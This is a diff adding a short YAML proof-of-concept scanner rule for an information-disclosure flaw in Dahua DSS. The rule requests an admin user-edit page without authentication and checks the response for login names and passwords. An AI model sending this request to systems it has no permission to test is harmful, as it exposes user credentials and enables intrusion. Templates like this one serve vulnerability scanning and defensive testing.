@@ -1,0 +1,17 @@
+name: poc-yaml-dahua-DSS-edit-Information-disclosure
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/cascade_/user_edit.action?id=1
+    expression: response.status == 200 && response.body.bcontains(b'loginName') && response.body.bcontains(b'loginPass')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139346709
